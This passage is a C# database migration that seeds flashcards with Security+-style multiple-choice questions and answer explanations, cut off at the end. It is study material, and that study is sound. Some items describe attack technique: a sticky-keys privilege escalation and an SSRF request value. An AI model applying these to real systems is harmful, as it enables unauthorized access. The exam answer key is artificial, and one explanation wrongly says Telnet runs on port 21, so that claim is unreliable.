                values: new object[] { 209, "\r\n209. C. Vulnerability scans and port scans can often be detected in\r\nlogs by looking for a series of ports being connected to. In this\r\ncase, the log was created by scanning a system with an OpenVAS\r\nscanner. There is no indication of a successful login or other\r\nhacking attempt, and a service startup would show in the\r\nmessages log, not the auth log. A reboot would also show in the\r\nmessages log rather than the auth log.\r\n", 1, "\r\n209. While reviewing auth logs on a server that she maintains, Megan notices the following\r\nlog entries:\r\nApr 26 20:01:32 examplesys rshd[6101]: Connection from 10.0.2.15 on\r\nillegal port\r\nApr 26 20:01:48 examplesys rshd[6117]: Connection from 10.0.2.15 on\r\nillegal port\r\nApr 26 20:02:02 examplesys rshd[6167]: Connection from 10.0.2.15 on\r\nillegal port\r\nApr 26 20:02:09 examplesys rshd[6170]: Connection from 10.0.2.15 on\r\nillegal port\r\nApr 26 20:02:09 examplesys rshd[6172]: Connection from 10.0.2.15 on\r\nillegal port\r\nApr 26 20:02:35 examplesys rshd[6188]: Connection from 10.0.2.15 on\r\nillegal port\r\nApr 26 20:02:35 examplesys rlogind[6189]: Connection from 10.0.2.15 on\r\nillegal port\r\nWhat has she most likely detected?\r\nA. A successful hacking attempt\r\nB. A failed service startup\r\nC. A vulnerability scan\r\nD. A system reboot\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 210, "\r\n210. C. Although it may be tempting to immediately upgrade,\r\nreading and understanding the CVEs for a vulnerability is a good\r\nbest practice. Once Charles understands the issue, he can then\r\nremediate it based on the recommendations for that specific\r\nproblem. Disabling PHP or the web server would break the\r\nservice, and in this case, only newer versions of PHP than 5.4\r\nhave the patch Charles needs.\r\n", 1, "\r\n210. The following graphic shows a report from an OpenVAS vulnerability scan. What should\r\nCharles do first to determine the best fix for the vulnerability shown?\r\nA. Disable PHP-CGI.\r\nB. Upgrade PHP to version 5.4.\r\nC. Review the vulnerability descriptions in the CVEs listed.\r\nD. Disable the web server.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 199, "\r\n199. D. Predictive analysis tools use large volumes of data, including\r\ninformation about security trends and threats, large security\r\ndatasets from various security tools and other sources, and\r\nbehavior patterns, to predict and identify malicious and\r\nsuspicious behavior.\r\n", 1, "\r\n199. Where does the information for predictive analysis for threat intelligence come from?\r\nA. Current security trends\r\nB. Large security datasets\r\nC. Behavior patterns\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 211, "\r\n211. D. Although 80 and 443 are the most common HTTP ports, it\r\nis common practice to run additional web servers on port 8080\r\nwhen a nonstandard port is needed. SSH would be expected to\r\nbe on port 22, RDP on 3389, and MySQL on 3306.\r\n", 1, "\r\n211. Ian runs a vulnerability scan, which notes that a service is running on TCP port 8080. What\r\ntype of service is most likely running on that port?\r\nA. SSH\r\nB. RDP\r\nC. MySQL\r\nD. HTTP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 213, "\r\n213. C. A network device running SSH and a web server on TCP port\r\n443 is a very typical discovery when running a vulnerability\r\nscan. Without any demonstrated issues, Carolyn should simply\r\nnote that she saw those services. Telnet runs on port 21, an\r\nunencrypted web server will run on TCP 80 in most cases, and\r\nWindows fileshares use a variety of ports including TCP ports\r\n135–139 and 445.\r\n", 1, "\r\n213. Carolyn runs a vulnerability scan of a network device and discovers that the device is\r\nrunning services on TCP ports 22 and 443. What services has she most likely discovered?\r\nA. Telnet and a web server\r\nB. FTP and a Windows fileshare\r\nC. SSH and a web server\r\nD. SSH and a Windows fileshare\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 214, "\r\n214. B. Configuration reviews, either using automated tool or\r\nmanual validation, can be a useful proactive way to ensure that\r\nunnecessary ports and services are not accessible. Configuration\r\nmanagement tools can also help ensure that expected\r\nconfigurations are in place. Neither passive nor active network\r\npacket capture will show services that are not accessed, meaning\r\nthat open ports could be missed, and log review won’t show all\r\nopen ports either.\r\n", 1, "\r\n214. Ryan needs to verify that no unnecessary ports and services are available on his systems, but\r\nhe cannot run a vulnerability scanner. What is his best option?\r\nA. Passive network traffic capture to detect services\r\nB. A configuration review\r\nC. Active network traffic capture to detect services\r\nD. Log review\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 215, "\r\n215. C. Errors are considered a vulnerability because they often\r\nprovide additional details about the system or its configuration.\r\nThey typically cannot be used to directly exploit or crash the\r\nsystem.\r\n", 1, "\r\n215. Why is improper error handling for web applications that results in displaying error messages\r\nconsidered a vulnerability that should be remediated?\r\nA. Errors can be used to crash the system.\r\nB. Many errors result in race conditions that can be exploited.\r\nC. Many errors provide information about the host system or its configuration.\r\nD. Errors can change system permissions.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 216, "\r\n216. D. This appears to be a situation where your network’s DNS\r\nserver is compromised and sending people to a fake site. A\r\nTrojan horse is malware tied to a legitimate program. IP\r\nspoofing would be using a fake IP address, but that is not\r\ndescribed in this scenario. In fact, the users are not even typing\r\nin IP addresses—they are typing in URLs. Clickjacking involves\r\ntricking users into clicking something other than what they\r\nintended.\r\n", 1, "\r\n216. Some users on your network use Acme Bank for their personal banking. Those users have\r\nall recently been the victim of an attack, in which they visited a fake Acme Bank website and\r\ntheir logins were compromised. They all visited the bank website from your network, and\r\nall of them insist they typed in the correct URL. What is the most likely explanation for this\r\nsituation?\r\nA. Trojan horse\r\nB. IP spoofing\r\nC. Clickjacking\r\nD. DNS poisoning\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 217, "\r\n217. C. This is a classic example of typo squatting. The website is off\r\nby only one or two letters; the attacker hopes that users of the\r\nreal website mistype the URL and are taken to their fake\r\nwebsite. Session hijacking is taking over an authenticated\r\nsession. Cross-site request forgery sends fake requests to a\r\nwebsite that purport to be from a trusted, authenticated user.\r\nClickjacking attempts to trick users into clicking on something\r\nother than what they intended.", 1, "\r\n217. John is a network administrator for Acme Company. He has discovered that someone has\r\nregistered a domain name that is spelled just one letter different than his company’s domain.\r\nThe website with the misspelled URL is a phishing site. What best describes this attack?\r\nA. Session hijacking\r\nB. Cross-site request forgery\r\nC. Typo squatting\r\nD. Clickjacking", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 218, "1. C. The diagram shows services and ports, but it does not list the\r\nprotocol. Ben should ask if these are TCP- or UDP-based\r\nservices, since an incorrect guess would result in a\r\nnonfunctional service, and opening up unnecessary protocols\r\nmay inadvertently create exposures or risks. The subnet mask is\r\nshown where multiple systems in a network on the client side\r\nrequire it, the service name isn’t necessary for a firewall rule,\r\nand API keys should not be stored in documents like this.\r\n", 2, "1. Ben is reviewing configuration management documentation for his organization and finds the\r\nfollowing diagram in his company’s document repository. What key information is missing\r\nfrom the diagram that a security professional would need to build firewall rules based on\r\nthe diagram?\r\nClient\r\nworkstations\r\nFirewall\r\nServer\r\n192.168.10/24 10.1.10.111\r\nPorts 139, 445 Ports 139, 445\r\nA. The subnet mask\r\nB. The service name\r\nC. The protocol the traffic uses\r\nD. The API key\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 219, "\r\n2. A. The correct answer is the Open Web Application Security\r\nProject (OWASP). It is the de facto standard for web application\r\nsecurity.\r\nThe North American Electric Reliability Corporation (NERC) is\r\nconcerned with electrical power plant security, Trusted Foundry\r\nis a term used to describe a secure supply chain for computer\r\nICs, and ISA/IEC standards are for securing industrial\r\nautomation and control systems (IACSs).\r\n", 2, "\r\n2. You are responsible for network security at an e-commerce company. You want to ensure\r\nthat you are using best practices for the e-commerce website your company hosts. What\r\nstandard would be the best for you to review?\r\nA. OWASP\r\nB. NERC\r\nC. Trusted Foundry\r\nD. ISA/IEC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 220, "\r\n3. B. Vendor diversity gives two security benefits. The first is that\r\nthere is no single point of failure should one vendor cease\r\noperations. The second benefit is that each vendor has a specific\r\nmethodology and algorithms used for detecting malware. If you\r\nuse the same vendor at all points where you need malware\r\ndetection, any flaw or weakness in that vendor’s methodology\r\nwill persist across the network. Using a single vendor means that\r\nany weakness in that vendor’s methodology or technology could\r\nimpact the entire system or network. Vendor forking is not a\r\nterm in the industry, and this is not a neutral act; vendor\r\ndiversity improves security.\r\n", 2, "\r\n3. Cheryl is responsible for cybersecurity at a mid-sized insurance company. She has decided to\r\nuse a different vendor for network antimalware than she uses for host antimalware. Is this a\r\nrecommended action, and why or why not?\r\nA. This is not recommended; you should use a single vendor for a particular security\r\ncontrol.\r\nB. This is recommended; this is described as vendor diversity.\r\nC. This is not recommended; this is described as vendor forking.\r\nD. It is neutral. This does not improve or detract from security.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 221, "\r\n4. B. In this scenario, the best fit to Scott’s needs is a second\r\nnetwork attached storage (NAS) device with a full copy of the\r\nprimary NAS. In a failure scenario, the secondary NAS can\r\nsimply take the place of the primary NAS while individual disks\r\nor even the whole NAS is replaced. Tape-based backups take\r\nlonger to restore, regardless of whether they are full or\r\nincremental backups, although incremental backups can take\r\nmore time in some cases since swapping tapes in order can add\r\ntime to the restoration process. Finally, a cloud-based backup\r\nsystem would be useful if Scott was worried about a local\r\ndisaster but would be slower than a local identical NAS, thus not\r\nmeeting Scott’s primary requirement.\r\n", 2, "\r\n4. Scott wants to back up the contents of a network-attached storage (NAS) device used in a\r\ncritical department in his company. He is concerned about how long it would take to restore\r\nthe device if a significant failure happened, and he is less concerned about the ability to\r\nrecover in the event of a natural disaster. Given these requirements, what type of backup\r\nshould he use for the NAS?\r\nA. A tape-based backup with daily full backups\r\nB. A second NAS device with a full copy of the primary NAS\r\nC. A tape-based backup with nightly incremental backups\r\nD. A cloud-based backup service that uses high durability near-line storage\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 222, "\r\n5. C. Restoration order can be very important in a complex\r\nenvironment due to system dependencies. Restoration order can\r\nalso ensure that the proper security controls are in place before\r\nsystems are online. A datacenter should be able to handle\r\nsystems coming online without failing if its power systems are\r\nproperly designed. A second outage due to failed systems would\r\nmean that Yasmine has not determined why the outage has\r\noccurred, making restoration potentially dangerous or\r\nproblematic. Finally, fire suppression systems should only\r\nactivate for an actual fire or when fire precursors like smoke are\r\ndetected, not for increased heat load.\r\n", 2, "\r\n5. Yasmine is responding to a full datacenter outage, and after referencing the documentation for\r\nthe systems in the datacenter she brings the network back up, then focuses on the storage area\r\nnetwork (SAN), followed by the database servers. Why does her organization list systems\r\nfor her to bring back online in a particular series?\r\nA. The power supply for the building cannot handle all the devices starting at once.\r\nB. The organization wants to ensure that a second outage does not occur due to failed\r\nsystems.\r\nC. The organization wants to ensure that systems are secure and have the resources they\r\nneed by following a restoration order.\r\nD. The fire suppression system may activate due to the sudden change in heat, causing\r\nsignificant damage to the systems.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 223, "\r\n6. B. Air gapping refers to the server not being on a network. This\r\nmeans literally that there is “air” between the server and the\r\nnetwork. This prevents malware from infecting the backup\r\nserver. A separate VLAN or physical network segment can\r\nenhance security but is not as effective as air gapping. A\r\nhoneynet is used to detect attacks against a network, but it\r\ndoesn’t provide effective defense against malware in this\r\nscenario.\r\n", 2, "\r\n6. Enrique is concerned about backup data being infected by malware. The company backs\r\nup key servers to digital storage on a backup server. Which of the following would be most\r\neffective in preventing the backup data being infected by malware?\r\nA. Place the backup server on a separate VLAN.\r\nB. Air-gap the backup server.\r\nC. Place the backup server on a different network segment.\r\nD. Use a honeynet.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 212, "\r\n212. B. Once this issue is remediated, Rick should investigate why\r\nthe system was running a plug-in from 2007. In many cases,\r\nwhen you discover a vulnerable component like this it indicates\r\na deeper issue that exists in the organization or processes for\r\nsystem and application maintenance. Installing a web\r\napplication firewall (WAF) or reviewing intrusion prevention\r\nsystem (IPS) logs may be useful if Rick thinks there are ongoing\r\nattacks or that successful attacks have occurred, but the problem\r\ndoes not state anything about that. There is no indication of\r\ncompromise, merely a completely outdated plug-in version in\r\nthe problem. If you want a sample system with vulnerable plugins\r\nlike this to test, you can download the 2015 release of the\r\nOpen Web Application Security Project (OWASP) broken web\r\napplications virtual machine. It has a wide range of completely\r\nout-of-date applications and services to practice against.\r\n", 1, "\r\n212. Rick runs WPScan against a potentially vulnerable WordPress installation. WPScan is a web\r\napplication security scanner designed specifically for WordPress sites. As part of the scan\r\nresults, he notices the following entry:\r\nWhat should Rick do after remediating this vulnerability?\r\nA. Install a web application firewall.\r\nB. Review the patching and updating process for the WordPress system.\r\nC. Search for other compromised systems.\r\nD. Review IPS logs for attacks against the vulnerable plug-in.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 198, "\r\n198. C. The most common motivation for hacktivists is to make a\r\npolitical statement. Reputational gains are often associated with\r\nscript kiddies, whereas financial gain is most commonly a goal of\r\norganized crime or insider threats. Gathering high-value data is\r\ntypical of both nation-state actors and organized crime.\r\n", 1, "\r\n198. What is the typical goal intent or goal of hacktivists?\r\nA. Increasing their reputation\r\nB. Financial gain\r\nC. Making a political statement\r\nD. Gathering high-value data\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 197, "\r\n197. B. Training an artificial intelligence (AI) or machine learning\r\n(ML) system with tainted data is a significant concern. Elias\r\nneeds to ensure that the traffic on his network is typical and\r\nnonmalicious to ensure that the AI does not presume that\r\nmalicious traffic is normal for his network.\r\n", 1, "\r\n197. Elias has implemented an AI-based network traffic analysis tool that requires him to allow\r\nthe tool to monitor his network for a period of two weeks before being put into full\r\nproduction. What is the most significant concern he needs to address before using the AI’s\r\nbaselining capabilities?\r\nA. The network should be isolated to prevent outbound traffic from being added to the\r\nnormal traffic patterns.\r\nB. Compromised or otherwise malicious machines could be added to the baseline resulting\r\nin tainted training data.\r\nC. Traffic patterns may not match traffic throughout a longer timeframe.\r\nD. The AI may not understand the traffic flows in his network.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 196, "\r\n196. D. Contractual terms, auditing, and security reviews are all\r\ncommon means of reducing third-party risks when working with\r\na vendor that is performing systems integration work. An SOC\r\n(service organization controls) report would typically be\r\nrequested if you were going to use a third-party vendor’s\r\ndatacenter or hosted services.\r\n", 1, "\r\n196. Alaina wants to ensure that the on-site system integration that a vendor that her company is\r\nworking with is done in accordance with industry best practices. Which of the following is\r\nnot a common method of ensuring this?\r\nA. Inserting security requirements into contracts\r\nB. Auditing configurations\r\nC. Coordinating with the vendor for security reviews during and after installation\r\nD. Requiring an SOC report\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 171, "\r\n171. B. TCP port 23 is typically associated with Telnet, an\r\nunencrypted remote shell protocol. Since Telnet sends its\r\nauthentication and other traffic in the clear (clear/plain text), it\r\nshould not be used, and Lucca should identify this as a\r\nconfiguration issue involving an insecure protocol.\r\n", 1, "\r\n171. After running nmap against a system on a network, Lucca sees that TCP port 23 is open and\r\na service is running on it. What issue should he identify?\r\nA. Low ports should not be open to the Internet.\r\nB. Telnet is an insecure protocol.\r\nC. SSH is an insecure protocol.\r\nD. Ports 1-1024 are well-known ports and must be firewalled.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 172, "\r\n172. B. Privilege escalation attacks focus on gaining additional\r\nprivileges. In this case, Cameron used physical access to the\r\nsystem to modify it, allowing him to then conduct a privilege\r\nescalation attack as an unprivileged user. A Trojan would have\r\nrequired a file to act like it was desirable, a denial-of-service\r\nattack would have prevented access to a system or service, and\r\nswapfiles (or pagefiles) are drive space used to contain the\r\ncontents of memory when memory runs low. Swapfiles may\r\ncontain sensitive data, but the term swapfile attack is not\r\ncommonly used.\r\n", 1, "\r\n172. During a penetration test, Cameron gains physical access to a Windows system and uses a\r\nsystem repair disk to copy cmd.exe to the %systemroot%\\system32 directory while\r\nrenaming it sethc.exe. When the system boots, he is able to log in as an unprivileged user,\r\nhit the Shift key five times, and open a command prompt with system-level access using\r\nsticky keys. What type of attack has he conducted?\r\nA. A Trojan attack\r\nB. A privilege escalation attack\r\nC. A denial-of-service attack\r\nD. A swapfile attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 173, "\r\n173. C. Common attributes of threat actors that you should be able\r\nto describe and explain for the Security+ exam include whether\r\nthey are internal or external threats, their level of sophistication\r\nor capability, their resources or funding, and their intent or\r\nmotivation. The number of years of experience is difficult to\r\ndetermine for many threat actors and is not a direct way to\r\ngauge their capabilities, and is therefore not a common attribute\r\nthat is used to assess them.\r\n", 1, "\r\n173. Adam wants to describe threat actors using common attributes. Which of the following list\r\nis not a common attribute used to describe threat actors?\r\nA. Internal/external\r\nB. Resources or funding level\r\nC. Years of experience\r\nD. Intent/motivation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 174, "\r\n174. B. Although engaging domain experts is often encouraged,\r\nrequiring third-party review of proprietary algorithms is not.\r\nMany machine learning algorithms are sensitive since they are\r\npart of an organization’s competitive advantage. Ensuring that\r\ndata is secure and of sufficient quality, ensuring a secure\r\ndevelopment environment, and requiring change control are all\r\ncommon artificial intelligence (AI)/machine learning (ML)\r\nsecurity practices.\r\n", 1, "\r\n174. Madhuri is concerned about the security of the machine learning algorithms that her organization\r\nis deploying. Which of the following options is not a common security precaution for\r\nmachine learning algorithms?\r\nA. Ensuring the source data is secure and of sufficient quality\r\nB. Requiring a third-party review of all proprietary algorithms\r\nC. Requiring change control and documentation for all changes to the algorithms\r\nD. Ensuring a secure environment for all development, data acquisition, and storage\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 175, "\r\n175. A. White teams act as judges and provide oversight of\r\ncybersecurity exercises and competitions. Options B and C may\r\nremind you of white- and gray-box tests, but they’re only there\r\nto confuse you. Cybersecurity teams are usually referred to with\r\ncolors like red, blue, and purple as the most common colors, as\r\nwell as the white teams that the Security+ exam outline\r\nmentions. Defenders in an exercise are part of the blue team.\r\n", 1, "\r\n175. Frank is part of a white team for a cybersecurity exercise. What role will he and his\r\nteam have?\r\nA. Performing oversight and judging of the exercise\r\nB. Providing full details of the environment to the participants\r\nC. Providing partial details of the environment to the participants\r\nD. Providing defense against the attackers in the exercise\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 176, "\r\n176. C. Bug bounties are increasingly common and can be quite\r\nlucrative. Bug bounty websites match vulnerability researchers\r\nwith organizations that are willing to pay for information about\r\nissues with their software or services. Ransoms are sometimes\r\ndemanded by attackers, but this is not a ransom since it was\r\nvoluntarily paid as part of a reward system. A zero-day\r\ndisclosure happens when a vulnerability is disclosed and the\r\norganization has not been previously informed and allowed to\r\nfix the issue. Finally, you might feel like $10,000 is a payday, but\r\nthe term is not used as a technical term and doesn’t appear on\r\nthe exam.\r\n", 1, "\r\n176. Susan receives $10,000 for reporting a vulnerability to a vendor who participates in a\r\nprogram to identify issues. What term is commonly used to describe this type of payment?\r\nA. A ransom\r\nB. A payday\r\nC. A bug bounty\r\nD. A zero-day disclosure\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 177, "\r\n177. A. Linux privileges can be set numerically, and 777 sets user,\r\ngroup, and world to all have read, write, and execute access to\r\nthe entire /etc directory. Setting permissions like this is a\r\ncommon workaround when permissions aren’t working but can\r\nexpose data or make binaries executable by users who should\r\nnot have access to them. When you set permissions for a system,\r\nremember to set them according to the rule of least privilege:\r\nonly the permissions that are required for the role or task should\r\nbe configured.\r\n", 1, "\r\n177. Charles sets the permissions on the /etc directory on a Linux system to 777 using the\r\nchmod command. If Alex later discovers this, what should he report his finding as?\r\nA. Open or weak permissions\r\nB. Improper file handling\r\nC. A privilege escalation attack\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 178, "\r\n178. B. Footprinting is the process of gathering information about a\r\ncomputer system or network, and it can involve both active and\r\npassive techniques. Mapping, fingerprinting, and aggregation\r\nare not the correct or common terms for this practice.\r\n", 1, "\r\n178. During a penetration test, Kathleen gathers information, including the organization’s\r\ndomain name, IP addresses, employee information, phone numbers, email addresses, and\r\nsimilar data. What is this process typically called?\r\nA. Mapping\r\nB. Footprinting\r\nC. Fingerprinting\r\nD. Aggregation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 179, "\r\n179. C. When dial-up modems were in heavy use, hackers would\r\nconduct war dialing exercises to call many phone numbers to\r\nfind modems that would answer. When wireless networks\r\nbecame the norm, the same type of language was used, leading\r\nto terms like war walking, war driving, and even war flying. The\r\nrest of the options were made up, but you should remember that\r\nthe Security+ exam expects you to know about war driving and\r\nwar flying.\r\n", 1, "\r\n179. What term is used to describe mapping wireless networks while driving?\r\nA. Wi-driving\r\nB. Traffic testing\r\nC. War driving\r\nD. CARINT\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 180, "\r\n180. B. Lighting and utility systems, as well as SCADA, PLCs, CNC,\r\nscientific equipment and similar devices are types of operational\r\ntechnology. Since this is a distributed attack that results in a\r\ndenial of service, it is a distributed denial-of-service (DDoS)\r\nattack. OT systems are often isolated or otherwise protected\r\nfrom remote network connections to prevent this type of attack\r\nsince many OT devices do not have strong security controls or\r\nfrequent updates. A SCADA overflow is not a term used in the\r\nindustry, but network and application DDoS attacks do appear\r\non the Security+ exam outline, and you will need to be able to\r\ndifferentiate them from this type of OT DDoS.\r\n", 1, "\r\n180. Fred discovers that the lighting and utility control systems for his company have been overwhelmed\r\nby traffic sent to them from hundreds of external network hosts. This has resulted\r\nin the lights and utility system management systems not receiving appropriate reporting, and\r\nthe endpoint devices cannot receive commands. What type of attack is this?\r\nA. A SCADA overflow\r\nB. An operational technology (OT) DDoS\r\nC. A network DDoS\r\nD. An application DDoS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 181, "\r\n181. C. A false negative occurs with a vulnerability scanning system\r\nwhen a scan is run and an issue that exists is not identified. This\r\ncan be because of a configuration option, a firewall, or other\r\nsecurity setting or because the vulnerability scanner is otherwise\r\nunable to detect the issue. A missing vulnerability update might\r\nbe a concern if the problem did not specifically state that the\r\ndefinitions are fully up-to-date. Unless the vulnerability is so\r\nnew that there is no definition, a missing update shouldn’t be\r\nthe issue. Silent patching refers to a patching technique that\r\ndoes not show messages to users that a patch is occurring. A\r\nfalse positive would have caused a vulnerability to show that was\r\nnot actually there. This sometimes happens when a patch or fix\r\nis installed but the application does not change in a way that\r\nshows the change.\r\n", 1, "\r\n181. Ben runs a vulnerability scan using up-to-date definitions for a system that he knows has\r\na vulnerability in the version of Apache that it is running. The vulnerability scan does not\r\nshow that issue when he reviews the report. What has Ben encountered?\r\nA. A silent patch\r\nB. A missing vulnerability update\r\nC. A false negative\r\nD. A false positive\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 182, "\r\n182. A. Refactoring a program by automated means can include\r\nadding additional text, comments, or nonfunctional operations\r\nto make the program have a different signature without\r\nchangings its operations. This is typically not a manual\r\noperation due to the fact that antimalware tools can quickly find\r\nnew versions. Instead, refactoring is done via a polymorphic or\r\ncode mutation technique that changes the malware every time it\r\nis installed to help avoid signature-based systems.\r\n", 1, "\r\n182. What type of technique is commonly used by malware creators to change the signature of\r\nmalware to avoid detection by antivirus tools?\r\nA. Refactoring\r\nB. Cloning\r\nC. Manual source code editing\r\nD. Changing programming languages\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 183, "\r\n183. B. Hybrid warfare is a relatively new term that describes the\r\nmultipronged attacks conducted as part of a military or national\r\nstrategy of political warfare that uses traditional, asymmetric,\r\nand cyberwarfare techniques along with influence methods to\r\nachieve goals.\r\n", 1, "\r\n183. What term describes a military strategy for political warfare that combines conventional\r\nwarfare, irregular warfare, and cyberwarfare with fake news, social media influence strategies,\r\ndiplomatic efforts, and manipulation of legal activities?\r\nA. Social warfare\r\nB. Hybrid warfare\r\nC. Social influence\r\nD. Cybersocial influence campaigns\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 184, "\r\n184. C. This is an example of a hoax. Hoaxes are fake security\r\nthreats and can consume both time and resources to combat.\r\nUser awareness and good habits for validating potential hoaxes\r\nare both useful ways to prevent them from consuming more\r\ntime and energy than they should. A phishing attempt would\r\ntarget credentials or other information, no identity information\r\nis mentioned for identity fraud here, and an invoice scam\r\ninvolves a fake or modified invoice.\r\n", 1, "\r\n184. Chris is notified that one of his staff was warned via a text message that the FBI is aware\r\nthat they have accessed illegal websites. What type of issue is this?\r\nA. A phishing attempt\r\nB. Identity fraud\r\nC. A hoax\r\nD. An invoice scam\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 185, "\r\n185. B. This is an attempt to get the server to send a request to itself\r\nas part of an API call, and it is an example of server-side request\r\nforgery. A cross-site scripting attack would use the victim’s\r\nbrowser rather than a server-side request, as would a CSRF\r\nattack.\r\n", 1, "\r\n185. Sarah is reviewing the logs for her web server and sees an entry flagged for review that\r\nincludes the following HTTP request:\r\nCheckinstockAPI=http://localhost/admin.php\r\nWhat type of attack is most likely being attempted?\r\nA. A cross-site scripting attack\r\nB. Server-side request forgery\r\nC. Client-side request forgery\r\nD. SQL injection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 186, "\r\n186. B. Threat hunting can involve a variety of activities such as\r\nintelligence fusion, combining multiple data sources and threat\r\nfeeds, and reviewing advisories and bulletins to remain aware of\r\nthe threat environment for your organization or industry.\r\n", 1, "\r\n186. Angela reviews bulletins and advisories to determine what threats her organization is likely\r\nto face. What type of activity is this associated with?\r\nA. Incident response\r\nB. Threat hunting\r\nC. Penetration testing\r\nD. Vulnerability scanning\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 187, "\r\n187. C. Passwords in memory are often stored in plain text for use.\r\nThis means that attackers can recover them if they can access\r\nthe memory where the password is stored, even if the storage is\r\nephemeral.\r\n", 1, "\r\n187. Why do attackers target passwords stored in memory?\r\nA. They are encrypted in memory.\r\nB. They are hashed in memory.\r\nC. They are often in plain text.\r\nD. They are often de-hashed for use.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 188, "\r\n188. D. The AIS service uses STIX and TAXII. STIX and TAXII are\r\nopen standards that the Department of Homeland Security\r\nstarted the development of and uses for this type of effort. You\r\ncan read more about AIS here: www.us-cert.gov/ais.\r\n", 1, "\r\n188. The U.S. Department of Homeland Security (DHS) provides an automated indicator sharing\r\n(AIS) service that allows for the federal government and private sector organizations to\r\nshare threat data in real time. The AIS service uses open source protocols and standards to\r\nexchange this information. Which of the following standards does the AIS service use?\r\nA. HTML and HTTPS\r\nB. SFTP and XML\r\nC. STIX and TRIX\r\nD. STIX and TAXII\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
